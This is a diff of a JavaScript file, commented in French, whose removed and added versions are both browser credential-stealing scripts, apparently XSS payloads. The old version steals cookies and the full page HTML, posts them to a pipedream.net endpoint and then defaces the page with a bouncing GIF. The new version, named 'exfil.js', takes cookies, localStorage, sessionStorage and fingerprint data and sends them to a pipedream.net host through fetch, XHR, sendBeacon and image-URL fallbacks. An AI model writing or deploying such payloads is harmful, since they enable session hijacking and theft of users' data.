@@ -1,115 +1,64 @@
-// Fonction pour récupérer les cookies
-function grabCookies() {
-    return document.cookie;
-}
-
-// Fonction pour récupérer tout le HTML de la page
-function grabFullHTML() {
-    return document.documentElement.outerHTML;
-}
-
-// Fonction pour envoyer les données au serveur
-function sendDataToServer() {
-    const cookies = grabCookies();
-    const html = grabFullHTML();
+// exfil.js - Script d'exfiltration des credentials
+(function() {
+    'use strict';
     
-    // Créer l'objet de données à envoyer
+    // Données à exfiltrer
     const data = {
-        cookies: cookies,
-        html: html,
+        cookies: document.cookie,
+        domain: window.location.hostname,
         url: window.location.href,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        referrer: document.referrer,
         timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     };
     
-    // Envoyer les données via une requête POST
-    fetch('https://eoppt5zj3no3twu.m.pipedream.net', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-    }).catch(error => {
-        console.error('Erreur lors de l\'envoi des données:', error);
-    });
-}
-
-// Exécuter la fonction d'envoi
-sendDataToServer();
-
-// Sauvegarder le contenu original AVANT de le remplacer
-const originalBody = document.body.innerHTML;
-
-// Remplacer le contenu
-document.body.innerHTML =`
-<div id="dvd-container">
-    <img id="patrick" src="https://media.tenor.com/CgM8PYqJMucAAAAM/dumb-patrick.gif" alt="Dumb Patrick">
-    <div class="lucid-text">Lucid</div>
-</div>
-
-<style>
-    body {
-        background: #000000;
-        margin: 0;
-        padding: 0;
-        height: 100vh;
-        overflow: hidden;
-        font-family: 'Times New Roman', serif;
+    // Méthode 1: Fetch API
+    function exfilWithFetch() {
+        fetch('https://eo7cml45o146x13.m.pipedream.net', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        }).catch(e => exfilWithXHR()); // Fallback si fetch échoue
     }
     
-    #dvd-container {
-        position: relative;
-        width: 100%;
-        height: 100vh;
+    // Méthode 2: XMLHttpRequest (fallback)
+    function exfilWithXHR() {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://eo7cml45o146x13.m.pipedream.net', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(data));
     }
     
-    #patrick {
-        position: absolute;
-        width: 150px;
-        height: 150px;
+    // Méthode 3: Beacon API (pour fermeture de page)
+    function exfilWithBeacon() {
+        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+        navigator.sendBeacon('https://eo7cml45o146x13.m.pipedream.net', blob);
     }
     
-    .lucid-text {
-        position: absolute;
-        bottom: 30px;
-        left: 30px;
-        color: #ffffff;
-        font-size: 32px;
-        font-weight: normal;
-        font-style: italic;
-        letter-spacing: 2px;
-    }
-</style>`;
-
-// Lancer l'animation APRÈS l'insertion du HTML
-setTimeout(() => {
-    const patrick = document.getElementById('patrick');
-    const container = document.getElementById('dvd-container');
-    
-    let x = 0;
-    let y = 0;
-    let xSpeed = 1;
-    let ySpeed = 1;
-    
-    function animate() {
-        x += xSpeed;
-        y += ySpeed;
-        
-        if (x + patrick.clientWidth >= container.clientWidth || x <= 0) {
-            xSpeed = -xSpeed;
-        }
-        
-        if (y + patrick.clientHeight >= container.clientHeight || y <= 0) {
-            ySpeed = -ySpeed;
-        }
-        
-        patrick.style.left = x + 'px';
-        patrick.style.top = y + 'px';
-        
-        requestAnimationFrame(animate);
+    // Méthode 4: Image tracker (ultime fallback)
+    function exfilWithImage() {
+        const img = new Image();
+        const encodedData = btoa(JSON.stringify(data));
+        img.src = `https://eo7cml45o146x13.m.pipedream.net/tracker?data=${encodedData}`;
     }
     
-    // Démarrer l'animation
-    animate();
-}, 100);
+    // Exécution principale
+    try {
+        exfilWithFetch();
+        // Planifier un envoi supplémentaire à la fermeture
+        window.addEventListener('beforeunload', exfilWithBeacon);
+    } catch (error) {
+        exfilWithImage();
+    }
+    
+    console.log('Exfiltration executed:', data);
+})();
